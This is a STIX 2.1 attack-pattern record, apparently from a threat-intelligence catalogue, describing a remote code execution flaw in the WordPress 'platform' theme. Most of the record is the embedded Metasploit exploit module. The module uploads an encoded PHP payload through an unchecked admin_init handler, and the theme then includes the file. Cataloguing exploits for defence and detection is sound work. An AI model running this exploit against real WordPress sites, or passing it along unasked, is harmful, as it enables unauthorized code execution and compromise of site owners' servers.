{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--27581067-26a2-46f5-929b-047ba6548c2c",
    "created": "2024-08-14T17:13:16.819688Z",
    "modified": "2024-08-14T17:13:16.819692Z",
    "name": "WordPress Platform Theme File Upload Vulnerability",
    "description": " The WordPress Theme \"platform\" contains a remote code execution vulnerability through an unchecked admin_init call. The theme includes the uploaded file from its temp filename with php's include function. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/wp_platform_exec.rb",
            "external_id": "wp_platform_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://blog.sucuri.net/2015/01/security-advisory-vulnerabilities-in-pagelinesplatform-theme-for-wordpress.html"
        },
        {
            "source_name": "WPVDB",
            "external_id": "7762"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HTTP::Wordpress\n\n  def initialize(info = {})\n    super(update_info(\n      info,\n      'Name'           => 'WordPress Platform Theme File Upload Vulnerability',\n      'Description'    => %q{\n        The WordPress Theme \"platform\" contains a remote code execution vulnerability\n        through an unchecked admin_init call. The theme includes the uploaded file\n        from its temp filename with php's include function.\n      },\n      'Author'         =>\n        [\n          'Marc-Alexandre Montpas', # initial discovery\n          'Christian Mehlmauer'     # metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['URL', 'http://blog.sucuri.net/2015/01/security-advisory-vulnerabilities-in-pagelinesplatform-theme-for-wordpress.html'],\n          ['WPVDB', '7762']\n        ],\n      'Privileged'     => false,\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [['platform < 1.4.4, platform pro < 1.6.2', {}]],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2015-01-21'))\n  end\n\n  def exploit\n    filename = \"Settings_#{rand_text_alpha(5)}.php\"\n\n    data = Rex::MIME::Message.new\n    data.add_part(payload.encoded, 'application/x-php', nil, \"form-data; name=\\\"file\\\"; filename=\\\"#{filename}\\\"\")\n    data.add_part('settings', nil, nil, 'form-data; name=\"settings_upload\"')\n    data.add_part('pagelines', nil, nil, 'form-data; name=\"page\"')\n    post_data = data.to_s\n\n    print_status(\"Uploading payload\")\n    send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => wordpress_url_admin_post,\n      'ctype'    => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'     => post_data\n    }, 5)\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-01-21",
    "x_mitre_platforms": [
        "['php']"
    ]
}